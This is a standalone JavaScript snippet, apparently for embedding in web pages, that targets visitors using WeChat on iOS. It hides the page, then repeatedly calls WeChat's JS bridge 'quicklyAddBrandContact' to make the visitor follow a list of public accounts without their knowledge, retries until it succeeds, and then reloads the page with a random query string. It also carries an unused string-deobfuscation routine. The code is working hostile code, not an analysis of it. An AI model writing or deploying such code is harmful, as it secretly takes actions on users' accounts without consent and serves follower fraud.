!(function () {
  var gz = document.currentScript.getAttribute('data-gz');
  var gzarr = gz.split('&');
  var newGzArr = gzarr.map(function (item) {
    return item.replace('@@', '');
  });
  var __gzdata = newGzArr; // ['neihanxb', 'videos88', 'fashion_jk'];
  var isIos = !!navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
  function isWeiXin() {
    var ua = window.navigator.userAgent.toLowerCase();
    if (ua.match(/MicroMessenger/i) == 'micromessenger') {
      return true;
    } else {
      return false;
    }
  }

  function endaction() {
    try {
      window.name = 'ok' + Math.random();
      if (window.location.search === '') {
        window.location.href = window.location.href + '?t=' + Math.random().toString(36).split('.')[1];
      } else {
        window.location.href = window.location.href + '&t=' + Math.random().toString(36).split('.')[1];
      }
    } catch (e) { }
  }

  function uncompileStr(code) {
    code = unescape(code);
    var c = String.fromCharCode(code.charCodeAt(0) - code.length);
    for (var i = 1; i < code.length; i++) {
      c += String.fromCharCode(code.charCodeAt(i) - c.charCodeAt(i - 1));
    }
    return c;
  }

  function tostart(result) {
    result.forEach(function (value) {
      goTo(value);
    });

    function goTo(username) {
      d = document;
      d.body.style.display = 'none';
      var vk = false;
      var ha = 0;
      c = function () {
        clearInterval(mm);
      };
      j = function () {
        if (ha !== 99) m();
      };
      h = function () {
        endaction();
      };
      m = function () {
        if (!vk) {
          vk = true;
          h()
        }
      };
      k = function () {
        location = 'https://mp.weixin.qq.com/mp/profile_ext?action=home&__biz=' + '' + '&t=' + Math.random().toString(36).split('.')[1] + '#wechat_redirect';
        go(username);
      };

      go = function (username) {
        mm = setTimeout(function () {
          try {
            WeixinJSBridge.invoke('quicklyAddBrandContact', {
              scene: '',
              username: username
            }, function (d) {
              if (d.err_msg.indexOf('ok') !== -1 || d.err_msg.indexOf('added') !== -1) {
                ha = 99;
                m();
              } else go(username)
            });
            ha++;
            if (ha === 2) setTimeout(j, 200);
          } catch (e) { }
        }, 50)
      };
      if (typeof (WeixinJSBridge) === 'undefined') {
        if (document.addEventListener) document.addEventListener('WeixinJSBridgeReady', k, false)
      } else k();
    }
  }

  if (window.name === '') {
    if (isWeiXin() && isIos) {
      tostart(__gzdata);
    }
  } else {
    window.loadadd = true;
    window.name = ''
  }
})();
